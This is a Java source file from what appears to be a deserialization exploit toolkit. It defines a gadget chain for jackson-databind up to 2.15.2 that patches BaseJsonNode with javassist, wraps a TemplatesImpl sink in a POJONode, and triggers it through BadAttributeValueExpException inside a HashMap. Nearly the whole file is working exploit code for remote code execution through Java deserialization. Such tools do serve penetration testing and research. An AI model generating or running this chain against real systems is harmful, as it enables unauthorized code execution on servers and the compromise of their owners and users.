package com.ppp.chain.json;

import com.fasterxml.jackson.databind.node.POJONode;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:<=2.15.2"})
@Authors({Authors.Y4ER})
@Sink({Sink.TemplatesImpl})
public class Jackson implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Jackson.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
            sinkObject = (o != null) ? o : sinkObject;
        }

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode node = new POJONode(templates);

        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(node);

        HashMap hashMap = new HashMap();
        hashMap.put(templates, badAttributeValueExpException);

        return hashMap;
    }
}
